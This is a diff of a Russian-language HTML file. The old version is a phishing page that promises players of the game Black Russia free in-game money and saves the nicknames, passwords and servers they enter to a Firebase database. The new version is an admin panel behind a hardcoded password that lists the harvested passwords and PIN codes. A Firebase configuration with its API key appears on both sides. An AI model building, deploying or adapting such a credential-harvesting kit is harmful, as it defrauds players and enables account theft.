@@ -1,247 +1,360 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Black Russia - Бонусная Система</title>
-  
-  <!-- Подключаем Firebase через CDN (версия 9 совместимая / v8) -->
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Панель Управления - Админ</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
-  <style>
-    /* Базовые стили и красивый фоновый градиент */
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-      background: linear-gradient(135deg, #1f2937, #111827, #0f172a);
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      color: #f3f4f6;
-      overflow: hidden;
-    }
+    <style>
+        /* Базовые сбросы */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
 
-    /* Эффект Liquid Glass (Матовое стекло) */
-    .glass-card {
-      background: rgba(255, 255, 255, 0.06);
-      backdrop-filter: blur(12px);
-      -webkit-backdrop-filter: blur(12px);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 16px;
-      padding: 30px;
-      width: 100%;
-      max-width: 380px;
-      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
-      box-sizing: border-box;
-      text-align: center;
-      transition: all 0.3s ease;
-    }
+        /* Установка фона с твоей картинкой */
+        body {
+            /* Подключаем твое фото. Добавлен легкий темный фильтр для лучшей читаемости текста */
+            background: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('moun.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 20px;
+        }
 
-    /* Изменяемый верхний текст / заголовок */
-    .promo-header {
-      font-size: 20px;
-      font-weight: 700;
-      margin-bottom: 8px;
-      color: #ffffff;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-    }
+        /* Кастомный стеклянный скроллбар */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: rgba(255, 255, 255, 0.05); }
+        ::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.2); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: rgba(255, 255, 255, 0.4); }
 
-    .promo-sub {
-      font-size: 14px;
-      color: #9ca3af;
-      margin-bottom: 24px;
-    }
+        /* Эффект матового стекла (Liquid Glass) точь-в-точь как на фото */
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 16px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            animation: fadeIn 0.4s ease-out forwards;
+            margin-top: 5vh;
+        }
 
-    /* Поля ввода */
-    .input-group {
-      margin-bottom: 16px;
-      text-align: left;
-    }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
 
-    .input-group label {
-      display: block;
-      font-size: 12px;
-      color: #9ca3af;
-      margin-bottom: 6px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
+        h2, h3 {
+            color: #ffffff;
+            margin-bottom: 30px;
+            text-align: center;
+            font-weight: 500;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
 
-    .input-field {
-      width: 100%;
-      padding: 12px 14px;
-      background: rgba(255, 255, 255, 0.04);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 8px;
-      color: #ffffff;
-      font-size: 14px;
-      box-sizing: border-box;
-      outline: none;
-      transition: border-color 0.2s, background-color 0.2s;
-    }
+        /* Поля ввода (Input) стилизованные под фото (прозрачные с линией внизу) */
+        .glass-input {
+            width: 100%;
+            padding: 10px 0;
+            margin-bottom: 30px;
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.4);
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
 
-    .input-field:focus {
-      border-color: rgba(255, 255, 255, 0.3);
-      background: rgba(255, 255, 255, 0.08);
-    }
+        .glass-input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
 
-    /* Плейсхолдеры */
-    ::placeholder {
-      color: #6b7280;
-    }
+        .glass-input:focus {
+            border-bottom-color: #14b8a6; /* Спокойный бирюзовый акцент */
+        }
 
-    /* Кнопка */
-    .submit-btn {
-      width: 100%;
-      padding: 14px;
-      background: rgba(255, 255, 255, 0.9);
-      border: none;
-      border-radius: 8px;
-      color: #111827;
-      font-size: 15px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: background 0.2s, transform 0.1s;
-      margin-top: 10px;
-    }
+        /* Главная кнопка как на фото */
+        .glass-btn {
+            width: 100%;
+            padding: 14px;
+            background: #14b8a6; /* Чистый цвет без неона */
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 15px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: background 0.2s ease, transform 0.1s;
+        }
 
-    .submit-btn:hover {
-      background: #ffffff;
-    }
+        .glass-btn:hover { background: #0d9488; }
+        .glass-btn:active { transform: scale(0.98); }
 
-    .submit-btn:active {
-      transform: scale(0.98);
-    }
+        .btn-danger {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            margin-top: 20px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        .btn-danger:hover { background: rgba(255, 255, 255, 0.1); }
 
-    /* Модальное окно об успешной отправке */
-    .modal {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.6);
-      backdrop-filter: blur(8px);
-      justify-content: center;
-      align-items: center;
-      z-index: 10;
-    }
+        /* Дашборд и статистика */
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+        }
 
-    .modal-content {
-      background: rgba(255, 255, 255, 0.08);
-      backdrop-filter: blur(16px);
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      border-radius: 16px;
-      padding: 30px;
-      max-width: 320px;
-      text-align: center;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-    }
+        .stats-box {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+        }
 
-    .modal-title {
-      font-size: 18px;
-      font-weight: 600;
-      margin-bottom: 12px;
-      color: #ffffff;
-    }
+        .stats-box span {
+            color: #14b8a6;
+            font-weight: bold;
+            font-size: 18px;
+        }
 
-    .modal-text {
-      font-size: 14px;
-      color: #d1d5db;
-      line-height: 1.5;
-    }
-  </style>
+        /* Карточка пользователя */
+        .user-card {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .user-card:hover { background: rgba(0, 0, 0, 0.3); }
+
+        .user-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .user-name { font-size: 16px; font-weight: 500; }
+        .user-date { font-size: 12px; color: rgba(255, 255, 255, 0.5); }
+
+        /* Скрытые детали (Аккордеон) */
+        .user-details {
+            display: none;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            animation: fadeIn 0.2s ease-out;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .detail-label { color: rgba(255, 255, 255, 0.6); }
+        .detail-value { color: #ffffff; }
+
+        .empty-state {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.6);
+            padding: 20px;
+        }
+
+        .dev-footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.4);
+        }
+        
+        /* Скрываем админку по умолчанию */
+        #dashboardScreen { display: none; }
+    </style>
 </head>
 <body>
 
-  <!-- Основная карточка входа -->
-  <div class="glass-card" id="authCard">
-    <!-- ЭТОТ ТЕКСТ ТЫ МОЖЕШЬ ИЗМЕНИТЬ НА ЛЮБОЙ ДРУГОЙ -->
-    <div class="promo-header">Хочешь получить 10кк?</div>
-    <div class="promo-sub">Зарегистрируйся прямо сейчас и получи 10кк бесплатно!</div>
-
-    <form id="regForm">
-      <div class="input-group">
-        <label for="username">Никнейм (Имя_Фамилия)</label>
-        <input type="text" id="username" class="input-field" placeholder="Ivan_Ivanov" required>
-      </div>
-
-      <div class="input-group">
-        <label for="password">Пароль</label>
-        <input type="password" id="password" class="input-field" placeholder="••••••••" required>
-      </div>
-
-      <div class="input-group">
-        <label for="server">Сервер (английскими буквами)</label>
-        <input type="text" id="server" class="input-field" placeholder="CHERRY" required>
-      </div>
-
-      <button type="submit" class="submit-btn">Зарегистрироваться</button>
-    </form>
-  </div>
-
-  <!-- Окно уведомления -->
-  <div class="modal" id="successModal">
-    <div class="modal-content">
-      <div class="modal-title">Заявка принята!</div>
-      <div class="modal-text">Деньги поступают в течении 1 дня. Пожалуйста, ожидайте зачисления на указанный аккаунт.</div>
+    <div class="glass-panel" id="loginScreen">
+        <h3>Вход в систему</h3>
+        <input type="password" id="adminPassword" class="glass-input" placeholder="Password">
+        <button class="glass-btn" onclick="verifyLogin()">SIGN IN</button>
+        <div class="dev-footer">Admin Panel System</div>
     </div>
-  </div>
 
-  <script>
-    // Твой конфиг Firebase Realtime Database
-    const firebaseConfig = {
-      apiKey: "AIzaSyCHjsiC8jC1AVkCvMmDXK7_fVKm6StpUtw",
-      authDomain: "beaschat-e0a28.firebaseapp.com",
-      projectId: "beaschat-e0a28",
-      storageBucket: "beaschat-e0a28.firebasestorage.app",
-      messagingSenderId: "906515573172",
-      appId: "1:906515573172:web:ee23ac70264e7a18d36ae1",
-      measurementId: "G-XLVW2SYHPM",
-      databaseURL: "https://beaschat-e0a28-default-rtdb.europe-west1.firebasedatabase.app"
-    };
-
-    // Инициализация Firebase
-    firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
-
-    // Обработка отправки формы
-    document.getElementById('regForm').addEventListener('submit', function(e) {
-      e.preventDefault(); // Предотвращаем перезагрузку страницы
-
-      const username = document.getElementById('username').value.trim();
-      const password = document.getElementById('password').value.trim();
-      const server = document.getElementById('server').value.trim();
-
-      // Генерируем уникальный ключ для каждого пользователя в базе данных
-      const newUserRef = database.ref('players').push();
-
-      // Сохраняем данные в Firebase Realtime Database
-      newUserRef.set({
-        username: username,
-        password: password,
-        server: server,
-        date: new Date().toISOString()
-      })
-      .then(() => {
-        // Очищаем форму
-        document.getElementById('regForm').reset();
+    <div class="glass-panel" id="dashboardScreen">
         
-        // Показываем окно "Деньги поступают в течении 1 дня"
-        const modal = document.getElementById('successModal');
-        modal.style.display = 'flex';
-      })
-      .catch((error) => {
-        console.error("Ошибка сохранения: ", error);
-        alert("Произошла ошибка при отправке данных. Попробуйте еще раз.");
-      });
-    });
-  </script>
+        <div class="dashboard-header">
+            <h3 style="margin-bottom: 0;">Игроки</h3>
+            <div class="stats-box">Всего: <span id="totalUsersCount">0</span></div>
+        </div>
 
+        <input type="text" id="searchInput" class="glass-input" placeholder="Поиск по нику..." onkeyup="filterUsers()">
+
+        <div id="usersContainer" style="max-height: 50vh; overflow-y: auto; padding-right: 5px;">
+            <div class="empty-state">Подключение к базе данных...</div>
+        </div>
+
+        <button class="glass-btn btn-danger" onclick="location.reload()">Выйти из панели</button>
+
+        <div class="dev-footer">
+            Developed by WaterCyborg2503
+        </div>
+    </div>
+
+    <script>
+        // ТВОЙ КОНФИГ FIREBASE
+        const firebaseConfig = {
+            apiKey: "AIzaSyCHjsiC8jC1AVkCvMmDXK7_fVKm6StpUtw",
+            authDomain: "beaschat-e0a28.firebaseapp.com",
+            projectId: "beaschat-e0a28",
+            storageBucket: "beaschat-e0a28.firebasestorage.app",
+            messagingSenderId: "906515573172",
+            appId: "1:906515573172:web:ee23ac70264e7a18d36ae1",
+            databaseURL: "https://beaschat-e0a28-default-rtdb.europe-west1.firebasedatabase.app"
+        };
+
+        // Инициализация
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        let allUsersData = [];
+
+        // Логика авторизации
+        function verifyLogin() {
+            const pass = document.getElementById('adminPassword').value;
+            if(pass === "1234") { // Твой пароль
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('dashboardScreen').style.display = 'block';
+                loadUsersFromDatabase();
+            } else {
+                alert("Неверный пароль!");
+            }
+        }
+
+        // Нажатие Enter на экране логина
+        document.getElementById("adminPassword").addEventListener("keypress", function(event) {
+            if (event.key === "Enter") {
+                event.preventDefault();
+                verifyLogin();
+            }
+        });
+
+        // Загрузка данных
+        function loadUsersFromDatabase() {
+            const container = document.getElementById('usersContainer');
+            
+            db.ref('users').on('value', (snapshot) => {
+                const data = snapshot.val();
+                allUsersData = [];
+                
+                if (!data) {
+                    container.innerHTML = '<div class="empty-state">База данных пуста.</div>';
+                    document.getElementById('totalUsersCount').innerText = "0";
+                    return;
+                }
+
+                for (let key in data) {
+                    allUsersData.push(data[key]);
+                }
+                allUsersData.reverse(); // Новые сверху
+
+                document.getElementById('totalUsersCount').innerText = allUsersData.length;
+                renderUsersList(allUsersData);
+            }, (error) => {
+                container.innerHTML = '<div class="empty-state" style="color:#fca5a5;">Ошибка доступа к базе (.read: false)</div>';
+            });
+        }
+
+        // Отрисовка списка игроков
+        function renderUsersList(usersArray) {
+            const container = document.getElementById('usersContainer');
+            container.innerHTML = ''; 
+
+            if (usersArray.length === 0) {
+                container.innerHTML = '<div class="empty-state">Ничего не найдено.</div>';
+                return;
+            }
+
+            usersArray.forEach(user => {
+                const card = document.createElement('div');
+                card.className = 'user-card';
+                
+                const uname = user.username || 'Неизвестный';
+                const udate = user.date || 'Дата неизвестна';
+                const upass = user.password || '---';
+                const upin = user.pincode || 'Не указан';
+                const userv = user.server || '---';
+
+                card.innerHTML = `
+                    <div class="user-header">
+                        <div class="user-name">${uname}</div>
+                        <div class="user-date">${udate}</div>
+                    </div>
+                    <div class="user-details">
+                        <div class="detail-row">
+                            <span class="detail-label">Пароль:</span>
+                            <span class="detail-value">${upass}</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Пин-код:</span>
+                            <span class="detail-value">${upin}</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Сервер:</span>
+                            <span class="detail-value" style="color: #14b8a6;">${userv}</span>
+                        </div>
+                    </div>
+                `;
+
+                // Раскрытие информации
+                card.onclick = function() {
+                    const details = this.querySelector('.user-details');
+                    if (details.style.display === 'block') {
+                        details.style.display = 'none';
+                        this.style.background = 'rgba(0, 0, 0, 0.2)';
+                    } else {
+                        document.querySelectorAll('.user-details').forEach(el => el.style.display = 'none');
+                        document.querySelectorAll('.user-card').forEach(el => el.style.background = 'rgba(0, 0, 0, 0.2)');
+                        
+                        details.style.display = 'block';
+                        this.style.background = 'rgba(0, 0, 0, 0.4)';
+                    }
+                };
+
+                container.appendChild(card);
+            });
+        }
+
+        // Поиск
+        function filterUsers() {
+            const query = document.getElementById('searchInput').value.toLowerCase();
+            const filteredData = allUsersData.filter(user => {
+                return user.username && user.username.toLowerCase().includes(query);
+            });
+            renderUsersList(filteredData);
+        }
+    </script>
 </body>
 </html>
